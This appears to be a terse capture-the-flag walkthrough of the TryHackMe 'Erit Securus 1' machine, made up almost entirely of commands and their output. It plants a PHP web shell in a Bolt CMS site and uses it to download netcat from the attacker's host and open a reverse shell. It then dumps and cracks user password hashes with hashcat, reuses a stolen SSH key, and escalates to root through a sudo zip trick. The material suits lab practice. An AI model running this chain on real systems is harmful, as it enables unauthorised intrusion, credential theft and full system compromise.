# nmap
```
root@kali:~# nmap -sV -sC -p- 10.10.115.202
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 23:15 UTC
Nmap scan report for ip-10-10-115-202.eu-west-1.compute.internal (10.10.115.202)
Host is up (0.0010s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)
|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)
|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)
|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)
80/tcp open  http    nginx 1.6.2
|_http-generator: Bolt
|_http-server-header: nginx/1.6.2
|_http-title: Graece donan, Latine voluptatem vocant. | Erit Securus 1
MAC Address: 02:E5:7F:F0:F7:78 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds
root@kali:~#

```


# exploit
```
https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py

http://10.10.42.215/bolt/login

echo '<?php system($_GET["c"]);?>'>cmd.php

acess
http://10.10.42.215/files/cmd.php?c=wget http://10.10.149.47:8000/nc
http://10.10.42.215/files/cmd.php?c=chmod 755 nc
http://10.10.42.215/files/c.php?c=./nc%20-e%20/bin/bash%2010.10.149.47%204444
python -c 'import pty;pty.spawn("/bin/bash")'
```

```
www-data@Erit:/var/www/html/app/database$ ls
ls
bolt.db
www-data@Erit:/var/www/html/app/database$ file bolt.db
file bolt.db
bolt.db: SQLite 3.x database, last written using SQLite version 3020001
www-data@Erit:/var/www/html/app/database$ sqlite3 bolt.db
sqlite3 bolt.db
SQLite version 3.16.2 2017-01-06 16:32:41
Enter ".help" for usage hints.
sqlite> .tables
.tables
bolt_authtoken          bolt_field_value        bolt_pages
bolt_blocks             bolt_homepage           bolt_relations
bolt_content_changelog  bolt_log                bolt_showcases
bolt_cron               bolt_log_change         bolt_taxonomy
bolt_entries            bolt_log_system         bolt_users
sqlite> select * from bolt_users
select * from bolt_users
   ...> ;
;
1|admin|$2y$10$8fToxs7/udTSpdV0J16IoOc5yGSF4yQJwdbhthy3kcYPcrTRKLAVW||0|a@a.com|2020-05-29 23:43:31|192.168.100.1|[]|1|||||["root","everyone"]
2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
sqlite>

root@kali:~# hashcat -m 3200 hash rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 1024/2953 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=6 -D KERN_TYPE=3200 -D _unroll'
* Device #1: Kernel m03200-pure.2ca65036.kernel not found in cache! Building may take a while...
* Device #1: Kernel amp_a0.0d337653.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.:snickers

Session..........: hashcat
Status...........: Cracked
Hash.Type........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3...jOCGq.
Time.Started.....: Sat May 30 00:18:53 2020 (25 secs)
Time.Estimated...: Sat May 30 00:19:18 2020 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       21 H/s (5.59ms) @ Accel:4 Loops:2 Thr:8 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 512/14344384 (0.00%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 448/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024
Candidates.#1....: lover -> letmein

Started: Sat May 30 00:18:35 2020
Stopped: Sat May 30 00:19:18 2020
root@kali:~#



```

```
wileec@Erit:~$ ls
ls
flag1.txt
wileec@Erit:~$ more flag1.txt
more flag1.txt
THM{Hey!_Welcome_in}
wileec@Erit:~$
wileec@Erit:~/.ssh$ ls -al
ls -al
total 20
drwxr-xr-x 2 wileec wileec 4096 Apr 25 15:32 .
drwxr-xr-x 4 wileec wileec 4096 Apr 25 17:15 ..
-rw------- 1 wileec wileec 1675 Apr 25 15:19 id_rsa
-rw-r--r-- 1 wileec wileec  393 Apr 25 15:19 id_rsa.pub
-rw-r--r-- 1 wileec wileec  222 Apr 25 15:32 known_hosts
wileec@Erit:~/.ssh$ ssh wileec@192.168.100.1 -i ./id_rsa
ssh wileec@192.168.100.1 -i ./id_rsa

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr 25 12:36:02 2020 from 192.168.100.100
$ sudo -l
sudo -l
Matching Defaults entries for wileec on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wileec may run the following commands on Securus:
    (jsmith) NOPASSWD: /usr/bin/zip
$

$ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 32%)
$ sudo rm $TF
sudo rm $TF
rm: missing operand
Try 'rm --help' for more information.
$ sudo -u jsmith rm $TF
sudo -u jsmith rm $TF
rm: missing operand
Try 'rm --help' for more information.
$ echo $TF
echo $TF

$ ls
ls
ls: cannot open directory .: Permission denied
$ pwd
pwd
/home/wileec
$ ls -al
ls -al
ls: cannot open directory .: Permission denied
$ whoami
whoami
jsmith
$ cd /home
cd /home
$ ls
ls
jsmith  wileec
$ cd jsmith
cd jsmith
$ ls
ls
flag2.txt
$ cat flag2.txt
cat flag2.txt
THM{Welcome_Home_Wile_E_Coyote!}


```

```
$ sudo -l
sudo -l
Matching Defaults entries for jsmith on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jsmith may run the following commands on Securus:
    (ALL : ALL) NOPASSWD: ALL
$ sudo su
sudo su
root@Securus:/home/jsmith# whoami
whoami
root
root@Securus:/home/jsmith# cd /root
cd /root
root@Securus:~# ls
ls
flag3.txt
root@Securus:~# cat flag3.txt
cat flag3.txt
THM{Great_work!_You_pwned_Erit_Securus_1!}
root@Securus:~#
```
